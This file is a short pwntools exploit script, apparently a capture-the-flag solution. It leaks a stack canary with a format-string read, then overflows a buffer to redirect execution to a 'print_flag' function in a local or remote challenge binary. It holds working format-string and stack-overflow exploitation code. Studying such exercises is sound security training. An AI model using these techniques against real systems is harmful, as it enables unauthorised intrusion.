from pwn import *

elf = context.binary = ELF('./task')

# it is because gets ends reading if we send newline character
while True:
	if args.GDB:
		p = gdb.debug(elf.path, '\n'.join([
			"b *vuln+73",
			"c"
		]))
	elif args.REMOTE:
		p = remote("localhost" if not args.ADDR else args.ADDR, 11325)
	else:
		p = process(elf.path)


	p.sendline(b"%9$lx")
	canary = p.recv().strip().decode()
	canary = int(canary, 16)
	print(f"Canary: {hex(canary)}")

	payload = b'A' * 24
	payload += p64(canary)
	payload += b'FAKE_RBP'
	payload += p64(elf.symbols['print_flag'])

	if b'\x0a' in payload:
		print("Repeat")
		continue

	p.sendline(payload)

	print(p.clean(1.0))
	break
